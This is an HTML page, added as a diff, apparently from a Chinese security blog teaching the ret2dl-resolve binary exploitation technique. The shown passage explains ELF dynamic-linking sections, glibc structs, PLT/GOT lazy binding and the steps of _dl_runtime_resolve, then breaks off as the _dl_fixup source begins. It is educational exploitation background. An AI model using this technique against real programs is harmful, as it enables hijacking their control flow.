@@ -1,0 +1,794 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/pikapika.jpg">
+  <link rel="icon" href="/img/pikapika.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Pursue">
+  <meta name="keywords" content="Pwner">
+  
+    <meta name="description" content="学习一下ret2dl-resolve的利用方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dl-resolve">
+<meta property="og:url" content="http://example.com/2022/04/17/Pwn/ret2dlresolve/index.html">
+<meta property="og:site_name" content="Pursue">
+<meta property="og:description" content="学习一下ret2dl-resolve的利用方法">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/photo/silhouette_night_starry_sky.jpg">
+<meta property="article:published_time" content="2022-04-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-07-16T06:44:17.927Z">
+<meta property="article:author" content="Pursue">
+<meta property="article:tag" content="ret2dl-resolve">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/photo/silhouette_night_starry_sky.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>ret2dl-resolve - Pursue</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 80vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Pursue</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/photo/silhouette_night_starry_sky.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ret2dl-resolve"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-04-17 00:00" pubdate>
+          2022年4月17日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          18k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          154 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ret2dl-resolve</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>在学习ret2dl-resolve的攻击方法之前，先补充一点关于ELF文件动态链接和重定位的知识。</p>
+<h3 id="几个重要的section"><a href="#几个重要的section" class="headerlink" title="几个重要的section"></a>几个重要的section</h3><ol>
+<li><p><code>.dynamic</code>：ld.so使用的动态链接信息，在IDA里面如下所示：</p>
+<p><img src="/ret2dlresolve/dynamic.png" srcset="/img/loading.gif" lazyload alt=".dynamic"></p>
+<p>这里面有很多信息，<strong>但我们现在只关心<code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_JMPREL</code>这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</strong></p>
+<p>这里给出32位和64位的结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Dynamic section entry.  */</span><br><br> <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class"> &#123;</span><br>   Elf32_Sword	d_tag;			<span class="hljs-comment">/* Dynamic entry type */</span><br>   <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">     &#123;</span><br>       Elf32_Word d_val;			<span class="hljs-comment">/* Integer value */</span><br>       Elf32_Addr d_ptr;			<span class="hljs-comment">/* Address value */</span><br>     &#125; d_un;<br> &#125; Elf32_Dyn;<br><br> <span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class"> &#123;</span><br>   Elf64_Sxword	d_tag;			<span class="hljs-comment">/* Dynamic entry type */</span><br>   <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">     &#123;</span><br>       Elf64_Xword d_val;			<span class="hljs-comment">/* Integer value */</span><br>       Elf64_Addr d_ptr;			<span class="hljs-comment">/* Address value */</span><br>     &#125; d_un;<br> &#125; Elf64_Dyn;<br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p><code>.dynstr</code>：一个字符串表，保存了动态链接所需的字符串，index[0]的地方值始终为零，在后续我们需要用这些字符串的时候，<strong>取的都是这些字符串相对于节表头的偏移</strong>，在IDA里面如下图所示：</p>
+<p><img src="/ret2dlresolve/dynstr.png" srcset="/img/loading.gif" lazyload alt=".dynstr"></p>
+</li>
+<li><p><code>.dynsym</code>：是一个符号表（结构体数组），该节保存了引用外部文件的符号，每一个结构体都对应一个符号，只能在运行时被解析，索引值从0开始计数，值为0的表项不具有实际的意义，表示未定义的符号，在IDA里面如下图所示：</p>
+<p><img src="/ret2dlresolve/dynsym.png" srcset="/img/loading.gif" lazyload alt=".dynsym"></p>
+<p>这里给出32位和64位的结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Word	st_name;		<span class="hljs-comment">/* Symbol name (string tbl index) 相对于.dynasr的偏移*/</span><br>  Elf32_Addr	st_value;		<span class="hljs-comment">/* Symbol value 当符号被导出时用于存放虚拟地址*/</span><br>  Elf32_Word	st_size;		<span class="hljs-comment">/* Symbol size */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>	st_info;		<span class="hljs-comment">/* Symbol type and binding */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>	st_other;		<span class="hljs-comment">/* Symbol visibility */</span><br>  Elf32_Section	st_shndx;		<span class="hljs-comment">/* Section index */</span><br>&#125; Elf32_Sym;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Word	st_name;		<span class="hljs-comment">/* Symbol name (string tbl index) */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>	st_info;		<span class="hljs-comment">/* Symbol type and binding */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other;		<span class="hljs-comment">/* Symbol visibility */</span><br>  Elf64_Section	st_shndx;		<span class="hljs-comment">/* Section index */</span><br>  Elf64_Addr	st_value;		<span class="hljs-comment">/* Symbol value */</span><br>  Elf64_Xword	st_size;		<span class="hljs-comment">/* Symbol size */</span><br>&#125; Elf64_Sym;<br><br><span class="hljs-comment">/* How to extract and insert information held in the st_info field.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_BIND(val)		(((unsigned char) (val)) &gt;&gt; 4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_TYPE(val)		((val) &amp; 0xf)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_INFO(bind, type)	(((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span><br><br><span class="hljs-comment">/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_ST_BIND(val)		ELF32_ST_BIND (val)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_ST_TYPE(val)		ELF32_ST_TYPE (val)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_ST_INFO(bind, type)	ELF32_ST_INFO ((bind), (type))</span><br><br><span class="hljs-comment">/* Legal values for ST_BIND subfield of st_info (symbol binding).  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_LOCAL	0		<span class="hljs-comment">/* Local symbol */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_GLOBAL	1		<span class="hljs-comment">/* Global symbol */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_WEAK	2		<span class="hljs-comment">/* Weak symbol */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>	STB_NUM		3		<span class="hljs-comment">/* Number of defined types.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_LOOS	10		<span class="hljs-comment">/* Start of OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_GNU_UNIQUE	10		<span class="hljs-comment">/* Unique symbol.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_HIOS	12		<span class="hljs-comment">/* End of OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_LOPROC	13		<span class="hljs-comment">/* Start of processor-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STB_HIPROC	15		<span class="hljs-comment">/* End of processor-specific */</span></span><br><br><span class="hljs-comment">/* Legal values for ST_TYPE subfield of st_info (symbol type).  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_NOTYPE	0		<span class="hljs-comment">/* Symbol type is unspecified */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_OBJECT	1		<span class="hljs-comment">/* Symbol is a data object */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_FUNC	2		<span class="hljs-comment">/* Symbol is a code object */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_SECTION	3		<span class="hljs-comment">/* Symbol associated with a section */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_FILE	4		<span class="hljs-comment">/* Symbol&#x27;s name is file name */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_COMMON	5		<span class="hljs-comment">/* Symbol is a common data object */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_TLS		6		<span class="hljs-comment">/* Symbol is thread-local data object*/</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>	STT_NUM		7		<span class="hljs-comment">/* Number of defined types.  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_LOOS	10		<span class="hljs-comment">/* Start of OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_GNU_IFUNC	10		<span class="hljs-comment">/* Symbol is indirect code object */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_HIOS	12		<span class="hljs-comment">/* End of OS-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_LOPROC	13		<span class="hljs-comment">/* Start of processor-specific */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STT_HIPROC	15		<span class="hljs-comment">/* End of processor-specific */</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/ret2dlresolve/st_info.png" srcset="/img/loading.gif" lazyload alt="st_info"></p>
+</li>
+<li><p><code>.rel.plt</code>：一个重定位表（其中<code>.rela.plt</code>是函数的重定位表），重定位是连接符号定义与符号引用的过程，简单来说，重定位需要把节中的符号引用转换成这些符号在进程空间的虚拟地址，在IDA如下图所示：</p>
+<p><img src="/ret2dlresolve/rel.plt.png" srcset="/img/loading.gif" lazyload alt=".rel.plt"></p>
+<p>给出32位和64位结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Addr	r_offset;		<span class="hljs-comment">/* Address 保存解析后的符号地址写入内存的位置（绝对地址）*/</span><br>  Elf32_Word	r_info;			<span class="hljs-comment">/* Relocation type and symbol index 高3位用于标识该符号在.dynsym段中的位置*/</span><br>&#125; Elf32_Rel;<br><br><span class="hljs-comment">/* I have seen two different definitions of the Elf64_Rel and</span><br><span class="hljs-comment">   Elf64_Rela structures, so we&#x27;ll leave them out until Novell (or</span><br><span class="hljs-comment">   whoever) gets their act together.  */</span><br><span class="hljs-comment">/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Addr	r_offset;		<span class="hljs-comment">/* Address */</span><br>  Elf64_Xword	r_info;			<span class="hljs-comment">/* Relocation type and symbol index */</span><br>&#125; Elf64_Rel;<br><br><span class="hljs-comment">/* Relocation table entry with addend (in section of type SHT_RELA).  */</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf32_Addr	r_offset;		<span class="hljs-comment">/* Address */</span><br>  Elf32_Word	r_info;			<span class="hljs-comment">/* Relocation type and symbol index */</span><br>  Elf32_Sword	r_addend;		<span class="hljs-comment">/* Addend */</span><br>&#125; Elf32_Rela;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  Elf64_Addr	r_offset;		<span class="hljs-comment">/* Address */</span><br>  Elf64_Xword	r_info;			<span class="hljs-comment">/* Relocation type and symbol index */</span><br>  Elf64_Sxword	r_addend;		<span class="hljs-comment">/* Addend */</span><br>&#125; Elf64_Rela;<br><br><span class="hljs-comment">/* How to extract and insert information held in the r_info field.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_SYM(val)		((val) &gt;&gt; 8)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_TYPE(val)		((val) &amp; 0xff)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_INFO(sym, type)		(((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_SYM(i)			((i) &gt;&gt; 32)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_TYPE(i)			((i) &amp; 0xffffffff)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_INFO(sym,type)		((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>r_offset</code>是在重定位时需要被修改的符号的偏移，指向got表中的对应函数</li>
+<li><code>r_info</code>分为两部分：<code>type</code>指示如何修改引用，<code>symbol</code>指示应该修改引用为哪个符号</li>
+</ul>
+</li>
+</ol>
+<h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><h4 id="PLT和GOT"><a href="#PLT和GOT" class="headerlink" title="PLT和GOT"></a>PLT和GOT</h4><p>延迟绑定的基本思想就是当函数第一次被调用时，动态链接器才进行符号查找、重定位等操作。如果未被调用则不进行绑定。ELF文件通过PLT和GOT的配合来实现延迟绑定，每个被调用的函数都有一组对应的PLT和GOT。</p>
+<p>PLT是位于代码段.plt节的一个数组，每个条目占8个字节，如下所示：</p>
+<ul>
+<li>PLT[0]：用于跳转到动态连接器</li>
+<li>PLT[1]：用于调用系统启动函数__libc_start_main()，main函数就是在这里被调用</li>
+<li><strong>PLT[2]：从这里开始就是被调用函数的条目</strong></li>
+</ul>
+<p>GOT是位于数据段.got.plt节的一个数组，每个条目占8个字节，如下所示：</p>
+<ul>
+<li>GOT[0]：动态链接器在解析函数地址时需要的地址<code>.dynamic</code>条目</li>
+<li>GOT[1]：动态链接器在解析函数地址时需要的地址<code>relor</code>条目(<code>reloc entries</code>)</li>
+<li>GOT[2]：动态链接器ld-linux.so的入口点，即<code>_dl_runtime_resolve</code>函数</li>
+<li><strong>GOT[3]：从这里开始就是被调用函数的条目</strong></li>
+</ul>
+<blockquote>
+<p>在这里说明以下，为了引入RELRO保护机制，GOT被拆分为<code>.got</code>节和<code>.got.plt</code>节两个部分，不用于延迟绑定的前者用于保存全局变量（只读），用于延迟绑定的后者则用于保存函数引用（读写）。</p>
+</blockquote>
+<h4 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h4><p>以调用func函数为例：</p>
+<ol>
+<li><p>首先会进入func@plt，第一条指令jmp跳转到指定的GOT条目，该位置保存的是func@plt的第二条指令</p>
+</li>
+<li><p>执行push指令，将对应的func在<code>.rel.plt</code>中的下标压栈（<strong>这里就是之后的reloc_index</strong>），然后进入PLT[0]</p>
+</li>
+<li><p>PLT[0]先将GOT[1]（一个<strong>link_map对象</strong>的地址）压栈，然后调用GOT[2]，即调用了<code>_dl_runtime_resolve()</code>函数，完成符号解析和重定位工作</p>
+<blockquote>
+<p>这里的link_map是用于获取解析导入函数所需要的信息，它包含了<code>.dynamic</code>的指针，通过这个<code>link_map</code>，<code>_dl_runtime_resolve</code>函数可以访问到<code>.dynamic</code>这个section。</p>
+</blockquote>
+</li>
+</ol>
+<h2 id="dl-runtime-resolve-函数"><a href="#dl-runtime-resolve-函数" class="headerlink" title="_dl_runtime_resolve()函数"></a>_dl_runtime_resolve()函数</h2><p>首先我们要了解：</p>
+<ul>
+<li><strong>每一个符号都是一个<code>Elf_Sym</code>结构体的实例，这些符号又共同组成了<code>.dynsym</code>段</strong></li>
+<li><strong>导入符号的解析需要进行重定位，每个重定位项都是一个<code>Elf_Rel</code>结构体的实例，这些项又共同组成了<code>.rel.plt</code>段（用于导入函数）和<code>.rel.dyn</code>段（用于导入全局变量）</strong></li>
+</ul>
+<p><img src="/ret2dlresolve/ret2dl.2.png" srcset="/img/loading.gif" lazyload alt="符号解析"></p>
+<p>当程序导入一个函数，动态链接器会同时在<code>.dynstr</code>段中添加一个函数名字符串，在<code>.dynsym</code>段中添加一个指向函数名字符串的<code>Elf_Sym</code>，在<code>.rel.plt</code>段中添加一个指向<code>Elf_Sym</code>的<code>Elf_Rel</code>，最后这些<code>Elf_Rel</code>的<code>r_offset</code>域又构成了GOT表，保存在<code>.got.plt</code>段中。</p>
+<p>我们具体来看一下<code>_dl_runtime_resolve(link_map, reloc_arg)</code>到底干了什么</p>
+<p>这里附上E4L4师傅的流程图：</p>
+<p><img src="/ret2dlresolve/ret2dl.1.png" srcset="/img/loading.gif" lazyload alt="流程图"></p>
+<ol>
+<li><strong>通过<code>link_map</code>访问<code>.dynamic</code>，并取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</strong></li>
+<li><strong><code>.rel.plt</code>的地址与传入的<code>reloc_arg</code>参数（即我们想要函数的<code>Elf_Rel</code>在<code>.rel.plt</code>中的偏移）相加得到该函数的重定位表<code>Elf_Rel</code></strong></li>
+<li><strong>通过<code>Elf_Rel</code>这个结构体的成员<code>r_info</code>的高3位（<code>rel-&gt;r_info &gt;&gt; 8</code>）得到该函数在<code>.dynsym</code>的索引，由此得到该函数的<code>Elf_Sym</code></strong></li>
+<li><strong>通过<code>Elf_Sym</code>这个结构体的成员<code>st_name</code>（<code>sym-&gt;st_name</code>)与<code>.dynstr</code>相加得到符号字符串的指针</strong></li>
+<li><strong>第一个<code>link_map</code>结构体成员的<code>l-&gt;l_addr</code>始终为0，与<code>Elf32_Rel</code>结构体的<code>rel-&gt;r_offset</code>成员相加就是该符号的<code>.got.plt</code>地址，只需要将得到的真实地址给<code>*rel-&gt;r_offset</code>即可</strong></li>
+</ol>
+<p><strong>注意：这里会检查<code>rel-&gt;r_info</code>的<code>type</code>，即其最低为是否是7，否则会发生警告。</strong></p>
+<p><code>_dl_runtime_resolve(link_map, reloc_arg)</code>实际调用的是<code>_dl_fixup(link_map, reloc_arg)</code>，这里贴出其源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 